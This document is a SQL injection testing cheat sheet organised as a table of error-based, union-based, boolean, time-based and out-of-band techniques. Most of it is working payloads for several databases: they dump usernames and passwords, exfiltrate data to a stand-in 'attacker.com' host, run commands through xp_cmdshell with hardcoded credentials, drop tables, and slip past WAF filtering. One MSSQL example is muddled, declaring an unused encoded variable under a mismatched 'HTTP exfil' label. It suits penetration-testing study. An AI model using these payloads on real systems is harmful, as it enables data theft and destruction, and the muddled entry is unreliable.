### SQL Injection (SQLi) Testing Checklist/Cheat Sheet

This cheat sheet provides a structured overview for testing SQLi
vulnerabilities. It categorizes by main types: **In-Band** (data returned in
the same channel), **Blind/Inferential** (infer data from app behavior), and
**Out-of-Band** (data exfiltrated via external channels). For each, I've
included subtypes, brief descriptions, testing steps, and example payloads
(tailored for common databases like MySQL, PostgreSQL, MSSQL, Oracle). Always
test in legal, controlled environments (e.g., your own apps or CTFs) and escape
inputs properly in production.

**General Testing Tips**:
- Start with basic probes like single quotes (`'`) to trigger errors.
- Use tools like Burp Suite, SQLMap, or manual fuzzing.
- Check inputs: GET/POST params, headers, cookies, URLs.
- Encode payloads if needed (e.g., URL-encode for web forms).
- Look for indicators: Errors, unexpected data, delays, or external requests.

| Type | Subtype | Description | Example Payloads & Testing Notes |
|------|---------|-------------|----------------------------------|
| **In-Band** | **Error-Based** | Exploits database errors to leak info (e.g., version, tables). Trigger errors with invalid syntax and extract data from error messages. | - Basic trigger: `'` or `''` (look for syntax errors).<br>- Extract DB version (MySQL): `' OR 1=1 --` or `1' AND 1=0 UNION SELECT @@version --` (if errors show).<br>- Extract tables (MSSQL): `'; EXEC sp_columns 'users' --`.<br>- Test: Input in search fields; if error reveals schema, vulnerable. |
| **In-Band** | **Union-Based** | Appends attacker's query to legitimate one using UNION; requires matching column count and types. Data returns in app response (e.g., extra rows). | - Column count probe: `ORDER BY 1--`, increment until error (e.g., `ORDER BY 5--` fails if 4 cols).<br>- Basic union (MySQL): `' UNION SELECT 1,2,3 --` (adjust numbers to match cols).<br>- Extract data: `' UNION SELECT username,password FROM users --`.<br>- PostgreSQL: `' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables --`.<br>- Test: If extra data appears in results (e.g., search returns unrelated rows), vulnerable. |
| **Blind/Inferential** | **Boolean-Based** | No errors/data returned; infer by true/false conditions that change app response (e.g., page content differs). | - Basic true/false: `AND 1=1 --` (page loads normally) vs. `AND 1=2 --` (page empty/error).<br>- Extract char-by-char (MySQL): `AND (SELECT SUBSTRING((SELECT @@version),1,1))='5' --` (true if version starts with '5').<br>- MSSQL: `AND (SELECT SUBSTRING(master..sysdatabases.name,1,1) FROM master..sysdatabases WHERE name='master')='m' --`.<br>- Test: Automate with scripts; check response length or keywords (e.g., "Welcome" appears on true). |
| **Blind/Inferential** | **Time-Based** | Infers data via delays; true condition causes sleep, false does nothing. Useful when boolean changes are subtle. | - Basic delay (MySQL): `AND IF(1=1, SLEEP(5), 0) --` (delays 5s if true).<br>- Extract data: `AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64, SLEEP(5), 0) --` (binary search for chars).<br>- PostgreSQL: `AND 1=(SELECT 1 FROM pg_sleep(5)) --`.<br>- Oracle: `AND (SELECT COUNT(*) FROM all_users WHERE rownum=1)=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5) --`.<br>- Test: Measure response time; if input causes consistent delay, vulnerable. |
| **Out-of-Band** | N/A (General) | Data sent via separate channel (e.g., DNS, HTTP, email). Requires DB functions that make external requests; rare but powerful if firewall blocks in-band. | - DNS exfil (MySQL): `'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\')) --` (resolves DNS with data).<br>- HTTP exfil (MSSQL): `'; DECLARE @q VARCHAR(99); SELECT @q = 0x77616974666F722064656C61792027303A303A313027; EXEC master..xp_cmdshell 'bcp "SELECT CAST((SELECT @@version) AS VARCHAR(8000))" queryout "c:\inetpub\wwwroot\version.txt" -c -S localhost -U sa -P pass'; --` (writes to file, fetch via web).<br>- Oracle: `AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) --` (sends data in URL).<br>- Test: Monitor your server logs (e.g., Burp Collaborator) for incoming requests with leaked data. |

**Advanced Considerations**:
- **Stacked Queries**: For multi-statement support (e.g., MSSQL), chain with `;`: `' ; DROP TABLE users --`.
- **Bypasses**: If WAF blocks, try encodings (e.g., `/**/` for spaces, `CHAR(39)` for quotes), case variations, or nested comments.
- **Automation**: Use SQLMap with `--technique=BEUSTQ` flags to specify types.
- **Mitigations to Check**: Prepared statements, input validation, least privilege DB users.

